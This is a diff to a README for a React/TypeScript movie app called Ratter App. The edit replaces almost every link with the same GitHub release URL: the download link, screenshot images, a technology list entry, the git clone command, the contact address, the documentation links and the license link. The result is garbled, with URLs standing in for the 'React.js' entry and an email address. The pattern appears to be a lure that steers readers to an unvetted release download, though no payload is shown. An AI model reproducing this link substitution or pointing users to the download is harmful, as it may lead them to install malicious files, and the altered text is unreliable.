@@ -10,16 +10,16 @@ Welcome to the official repository of the Ratter App, developed as part of the t
 agil-scrum, atomic-design, bdd-tdd, clean-code-architecture, ddd, figma, git-github, gitflow, heroicons, html-css-javascript, jest-testing-library, jira-notion, react-calendar, react-date-range-picker, reactjs, styled-components, tmdb-api, typescript, zustand
 
 ## 🚀 Get Started
-To access the project zip file, [click here: [Download Project]](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).  
+To access the project zip file, [click here: [Download Project]](https://github.com/perish76b/ratter-app/releases/tag/v1.0).  
 _Note: The download needs to be initiated._
 
 ## 🎥 Screenshots
 Here are some sneak peeks of the Ratter App:
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
+![Screenshot 2](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
 
 ## 💻 Technologies Used
-- React.js
+- https://github.com/perish76b/ratter-app/releases/tag/v1.0
 - TypeScript
 - HTML/CSS/JavaScript
 - Jest Testing Library
@@ -32,7 +32,7 @@ Here are some sneak peeks of the Ratter App:
 ## 🛠️ Setup Instructions
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/yourusername/ratter-app.git
+   git clone https://github.com/perish76b/ratter-app/releases/tag/v1.0
    ```
 2. Install dependencies:  
    ```bash
@@ -45,24 +45,24 @@ Here are some sneak peeks of the Ratter App:
 4. Open your browser and visit `http://localhost:3000` to see the app.
 
 ## 📌 Release Notes
-Check out the [Releases](https://github.com/yourusername/ratter-app/releases) section for detailed release notes and version history.
+Check out the [Releases](https://github.com/perish76b/ratter-app/releases/tag/v1.0) section for detailed release notes and version history.
 
 ## 🌟 Want to Contribute?
 We welcome contributions! If you have any ideas, suggestions, or improvements, feel free to open an issue or submit a pull request.
 
 ## 📞 Contact
-For any questions or inquiries, please contact our team at `ratter.app@example.com`.
+For any questions or inquiries, please contact our team at `https://github.com/perish76b/ratter-app/releases/tag/v1.0`.
 
 ## 🔗 Useful Links
-- [TMDB API Documentation](https://developers.themoviedb.org/3/getting-started/introduction)
-- [React.js Official Website](https://reactjs.org/)
-- [Styled Components Documentation](https://styled-components.com/)
+- [TMDB API Documentation](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
+- [https://github.com/perish76b/ratter-app/releases/tag/v1.0 Official Website](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
+- [Styled Components Documentation](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
 
 ## 📜 License
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/yourusername/ratter-app/blob/main/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/perish76b/ratter-app/releases/tag/v1.0](https://github.com/perish76b/ratter-app/releases/tag/v1.0) file for details.
 
 ---
 
 Thank you for checking out the Ratter App repository! We hope you enjoy exploring our project. Feel free to star the repository if you find it interesting! 🌟
 
-[![Download Project](https://img.shields.io/badge/Download Project-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/perish76b/ratter-app/releases/tag/v1.0 Project-blue)](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
